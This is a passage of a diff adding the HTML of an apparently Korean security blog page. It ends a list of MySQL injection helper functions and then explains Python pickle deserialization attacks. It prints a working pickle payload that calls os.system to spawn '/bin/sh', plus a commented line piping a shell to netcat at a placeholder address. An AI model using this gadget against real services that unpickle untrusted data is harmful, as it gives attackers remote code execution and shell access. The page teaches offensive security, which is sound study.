+  <li><code class="language-plaintext highlighter-rouge">version()</code> : get mysql version</li>
+  <li><code class="language-plaintext highlighter-rouge">database()</code> : get current database</li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="python-pickle-deserialization">python pickle deserialization</h3>
+<p>pickle로 직렬화된 객체가 변조되어 역직렬화하는 과정에서 시스템에 접근하거나 의도치 않은 것이 실행되기도 한다. 원하는 class를 선언한 뒤, __reduce__를 통하여 pickle.loadunpickle 시 tuple을 반환하여 함수를 실행시킬 수 있다.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">pickle</span>
+
+<span class="k">class</span> <span class="nc">payload</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+  <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+    <span class="c1">#return (os.system, ('ls', ))
+</span>    <span class="c1">#return (os.system, ('cat flag', ))
+</span>    <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">,</span> <span class="p">))</span>
+    <span class="c1">#return (os.system, ('/bin/sh | nc [ip] [port]', ))
+</span>
+<span class="n">pickle_d</span><span class="o">=</span><span class="n">pickle</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">())</span>
+<span class="n">pickle</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">pickle_d</span><span class="p">)</span> <span class="c1"># get shell anyway
+</span></code></pre></div></div>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="nb">id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">test</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">test</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">test</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>update 예정.</p>
+
+
+</br></br><hr>
+<div id="disqus_thread"></div>
+<script>
+    /**
+    *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+    *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables    */
+    /*
+    var disqus_config = function () {
+    this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+    this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    */
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://ainsetin.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+        
+          <button title="Toggle Theme" class="theme-toggle">
+  <svg viewBox="0 0 32 32" width="24" height="24" fill="currentcolor">
+    <circle cx="16" cy="16" r="14" fill="none" stroke="currentcolor" stroke-width="4"></circle>
+    <path d="
+             M 16 0
+             A 16 16 0 0 0 16 32
+             z">
+    </path>
+  </svg>
+</button>
+
+        
+        <div class="credits">&copy;&nbsp;2021&nbsp;Ainsetin
+          &nbsp;
+          •
+          &nbsp;Powered by <a href="https://www.soopr.co" target="_blank" rel="noreferrer">Soopr</a>
+          &nbsp;
+          •
+          &nbsp;Theme&nbsp; <a href="https://github.com/abhinavs/moonwalk" target="_blank" rel="noreferrer">Moonwalk</a>
+        </div>
+      </div>
+    </main><script async defer src="https://sdk.soopr.co/soopr.js"></script></body>
+</html>
